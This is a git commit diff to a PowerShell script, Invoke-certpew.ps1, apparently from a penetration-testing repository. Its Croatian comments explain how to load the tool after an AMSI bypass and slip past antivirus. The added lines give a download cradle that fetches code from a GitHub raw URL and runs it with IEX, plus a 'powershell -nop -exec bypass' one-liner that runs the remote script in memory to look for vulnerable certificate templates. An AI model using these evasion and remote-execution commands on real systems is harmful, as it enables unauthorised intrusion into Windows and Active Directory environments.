8d8186ed1fa05e24c69ea74162fcdde8358039a1
inkz1337 <113606031+inkz1337@users.noreply.github.com>
2022-12-21 14:53:35 +0100

    Update Invoke-certpew.ps1

--- Invoke-certpew.ps1
+++ Invoke-certpew.ps1
@@ -1,12 +1,16 @@
 #Lokalno ucitat skriptu double dotanjem nakon AMSI bypass-a
 <#
 Remotely ako zafrkava i ne mozete klasicnim Invoke-WebRequestom ucitati i executat skriptu radi AV-a, metoda ponize radi pa se moze napraviti skripta koja je neovisna o cijeloj ovoj funkciji ubiti malom kaskadom i dodatnom skriptom zovete certipy funkciju:
+
+kaskada.ps1:
 $webreq = [System.Net.WebRequest]::Create("https://raw.githubusercontent.com/inkz1337/ptest_related/main/Invoke-certpew.ps1") 
 $resp=$webreq.GetResponse() 
 $respstream=$resp.GetResponseStream() 
 $reader=[System.IO.StreamReader]::new($respstream) 
 $content=$reader.ReadToEnd()
-IEX($content) 
+IEX($content)
+
+I onda zovite certpew funkciju nakon citanja remotely kaskada.ps1. Npr. powershell -nop -exec -bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inkz1337/ptest_related/main/kaskada.ps1'); invoke-certpew find /vulnerable""
 #>
 
 
